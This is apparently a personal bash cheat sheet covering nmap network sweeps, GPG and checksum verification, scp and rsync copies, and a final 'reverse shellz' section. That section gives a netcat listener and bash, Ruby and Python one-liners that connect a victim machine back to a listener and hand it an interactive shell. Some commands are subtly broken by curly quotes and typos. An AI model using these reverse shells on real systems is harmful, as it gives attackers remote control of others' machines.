#!/usr/bin/env bash

#::::::#
# nmap #
#::::::#
nmap -v -sn 192.168.1.0/24 | grep -v down
sudo nmap -sn -PS22,3389 192.168.1.0/24 #custom TCP SYN scan
sudo nmap -sn -PU161 192.168.1.0/24 #custom UDP scan (catch 'em all)

# alternative: find those not answering to ping
x=0; while [ "$x" -lt "255" ]; do ping -c 1 10.0.0.$x & x=$(expr $x + 1); done
# Wait a few seconds for the pings above to finish
arp -a 


#:::::::::::::::#
# GPG & SHASUMS #
#:::::::::::::::#
# import keys
gpg --import key.asc
# list keys saved in .gnupg/pubring.kbx
gpg --list-keys 
# verify stuff
gpg --verify [some].iso.asc [some].iso
gpg --verify SHA256SUMS.gpg SHA256SUMS
# veryfy sha256
shasum256 -c SHASUM256 2>&1 | grep OK # 2>&1 means redirect errors to stdout
#or
"e04d717ff9d0fff8d125b23b357bcceaef2e8e3877af90b678fde5e1bf05e7e8 *filename" | shasum -c - 


#:::::#
# SSH #
#:::::#
#copy dir (simple)
scp /path/to/local/dir user@remotehost:/path/to/remote/dir
#copy dir (transfer only diffs and resume transfer when it breaks)
rsync -avz -e 'ssh -p 5022' /path/to/local/dir pi@127.0.1.0:/path/to/remote/dir


#::::::::::::::::#
# reverse shellz #
#::::::::::::::::#
# from https://hackernoon.com/reverse-shell-cf154dfee6bd
# 1) First there is a (my) machine listening somewhere on a specific tcp port. In this case using netcat
machine1: nc -vlp 80 
# -v, — verbose Set verbosity level (can be used several times); 
# -l, — listen Bind and listen for incoming connections; 
# -p, — source-port port Specify source port to use;

# 2) Then victim machine connects to listener:
  #bash
  machine2: bash -i >& /dev/tcp/192.168.1.142/80 0>&1
  
  #ruby
  ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’
  
  #python
  python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

